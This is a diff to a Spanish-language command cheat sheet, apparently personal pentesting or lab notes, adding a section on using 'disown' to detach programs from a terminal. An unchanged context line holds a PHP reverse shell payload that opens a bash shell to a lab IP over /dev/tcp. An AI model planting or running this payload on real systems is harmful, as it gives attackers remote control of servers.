@@ -233,6 +233,15 @@ Una variacion de reverse shell
 <?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.80/443 0>&1'"); ?>
 ```
 
+## disown
+
+Para que se abra un programa como firefox y no dependa de esa consola se pueda cerrar y no se cierre la consola que puedas seguir trabajando.
+
+```
+progrmaa &> /dev/null & disown
+ 
+```
+
 ## mkdir crear mas de un directorio 
 
 ```bash
